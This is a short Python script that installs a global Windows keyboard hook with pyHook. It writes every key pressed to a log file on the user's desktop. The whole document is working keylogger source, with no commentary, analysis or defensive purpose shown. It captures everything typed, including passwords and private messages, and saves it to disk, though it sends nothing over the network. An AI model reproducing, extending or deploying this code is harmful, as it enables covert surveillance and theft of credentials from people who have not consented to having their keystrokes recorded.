import sys
import logging
import pyHook
import pythoncom

KeyLog = 'C:\\Users\\Alex\\Desktop\\Python\\log.txt'


def keylog(event):
  logging.basicConfig(filename=KeyLog, level=logging.DEBUG, format='%(message)s')
  #chr(event.Ascii)
  logging.log(10,chr(event.KeyID))
  

logkeys = pyHook.HookManager()
logkeys.KeyDown = keylog
logkeys.HookKeyboard()
pythoncom.PumpMessages()